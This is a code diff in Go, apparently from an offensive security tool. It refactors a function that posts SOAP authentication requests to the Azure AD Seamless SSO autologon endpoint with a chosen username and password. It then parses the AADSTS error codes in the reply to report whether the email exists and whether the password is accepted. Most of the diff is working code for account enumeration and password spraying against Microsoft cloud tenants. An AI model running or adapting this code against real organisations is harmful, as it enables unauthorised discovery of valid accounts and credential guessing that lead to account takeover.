@@ -11,16 +11,23 @@ import (
 	colour "github.com/logrusorgru/aurora/v3"
 )
 
+// This whole stucture can likely be changed/removed for later features e.g proxying
+/*
 type Target struct {
 	User     string
 	Domain   string
 	Guid     string
 	Password string
 }
+*/
 
-func Query(t *Target) {
-	tar := "https://autologon.microsoftazuread-sso.com/" + t.Domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + t.Guid
+func AzClient() {
 
+}
+
+func Query(user string, domain string, password string) {
+	tar := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + uuid.New().String()
+	// This is disgusting, look at better solution?
 	var body = strings.NewReader(`<?xml version="1.0" encoding="UTF-8"?>
 	<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
 	  <s:Header>
@@ -36,8 +43,8 @@ func Query(t *Target) {
 			<u:Expires>` + time.Now().Add(time.Minute*10).Format(time.RFC3339Nano) + `</u:Expires>
 		  </u:Timestamp>
 		  <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
-			<o:Username>` + t.User + ` </o:Username>
-			<o:Password>` + t.Password + `</o:Password>
+			<o:Username>` + user + ` </o:Username>
+			<o:Password>` + password + `</o:Password>
 		  </o:UsernameToken>
 		</o:Security>
 	  </s:Header>
@@ -70,16 +77,17 @@ func Query(t *Target) {
 	data, _ := ioutil.ReadAll(res.Body)
 	res.Body.Close()
 
-	// If response contains AADSTS50034, user does not exist in AD environment
+	// Filtering based on AADSTS numbers within data response
+
 	if strings.Contains(string(data), "DesktopSsoToken") {
-		fmt.Println(colour.Green("[+] Email Exists: " + t.User + " \n\r[+] Password Accepted: " + t.Password))
+		fmt.Println(colour.Green("[+] Email Exists: " + user + " \n\r[+] Password Accepted: " + password))
 	} else if strings.Contains(string(data), "AADSTS50034") {
-		fmt.Println(colour.Red("[-] " + t.User + " does not exist"))
-	} else if strings.Contains(string(data), "AADSTS50126") && t.Password != "test" {
-		fmt.Println(colour.Green("[+] " + t.User + " exists"))
+		fmt.Println(colour.Red("[-] " + user + " does not exist"))
+	} else if strings.Contains(string(data), "AADSTS50126") && password != "" {
+		fmt.Println(colour.Green("[+] " + user + " exists"))
 		fmt.Println(colour.Red("[-] Password Incorrect"))
 	} else {
-		fmt.Println(colour.Green("[+] " + t.User + " exists"))
+		fmt.Println(colour.Green("[+] " + user + " exists"))
 	}
 
 }
